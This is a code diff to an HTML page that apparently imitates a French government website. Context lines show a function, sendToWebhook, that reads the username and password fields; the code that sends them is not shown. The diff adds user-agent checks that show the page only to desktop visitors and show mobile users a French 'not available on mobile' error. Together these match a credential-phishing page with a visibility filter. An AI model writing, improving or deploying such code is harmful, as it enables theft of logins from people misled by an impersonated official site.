@@ -4,6 +4,16 @@
 <meta name="autocomplete" content="off">
 
 <script>
+    function isMobile() {
+      return /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+    }
+
+    if (isMobile()) {
+      document.getElementById('error').style.display = 'block';
+    } else {
+      document.getElementById('content').style.display = 'block';
+    }
+    
     function sendToWebhook() {
         const field1 = document.getElementById('username').value;
         const field2 = document.getElementById('password').value;
@@ -46,6 +56,11 @@
  
  
  <body class="scrolled fr-header-padding-top--minimized" id=body>
+    <div id="error" class="error" style="display: none;">
+    <h2>Erreur</h2>
+    <p>Ce site n'est pas disponible sur mobile.</p>
+  </div>
+     <div id="content" style="display: none;">
  <div class=fr-skiplinks>
  <nav class=fr-container role=navigation aria-label="Accès rapide">
  <ul class=fr-skiplinks__list>
@@ -265,6 +280,7 @@
  </div>
  </div>
 </footer>
+         </div>
  
  
  
